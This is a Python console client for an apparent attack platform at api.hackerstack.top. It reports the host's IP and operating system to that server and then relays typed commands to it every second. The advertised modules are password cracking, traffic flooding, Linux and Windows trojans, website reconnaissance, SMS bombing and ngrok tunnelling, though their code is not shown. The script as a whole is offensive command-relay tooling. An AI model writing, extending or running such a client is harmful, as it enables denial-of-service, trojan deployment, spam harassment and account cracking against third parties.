
import requests
import json
import os
import time
import threading
import platform







# 获取操作系统名称
os_name = platform.system()



def get_my_ip():
    return requests.get("https://api.hackerstack.top/get_my_ip").text

fn_object = {
    "IP": get_my_ip(),
    "os": os_name,
    "密码破解模块": {
        "Command":"pwd_attacl",
        "Input":True
    },
    "流量攻击模块": {
        "Command":"traffic_attack",
        "Input":True
    },
    "Linux木马模块": {
        "Command":"linux_trojan",
        "Input":True
    },
    "Windows木马模块": {
        "Command":"windows_trojan",
        "Input":True
    },
    "网站信息收集模块" : {
        "Command":"web_info_gather",
        "Input":True
    },
    "短信轰炸模块" : {
        "Command":"sms_spam",
        "Input":True
    },
    "Ngrok内网穿透模块" : {
        "Command":"ngrok_tunnel",
        "Input":True
    }
}

api_server = "https://api.hackerstack.top"
driver_code = None

command = 'none'
def input_console():
    global command
    while True:
        command = input("请输入命令: ")
        

if __name__ == '__main__':
    driver_code = str(input("请输入识别码: ")).strip()
    try:
        target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":json.dumps(fn_object)}))
        t = threading.Thread(target=input_console)
        t.start()
        while True:
            target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":command}))
            command = 'none'
            time.sleep(1)
        # r = requests.get(api_server+"/virus_clear_command/"+driver_code)
    except:
        exit()

print(driver_code)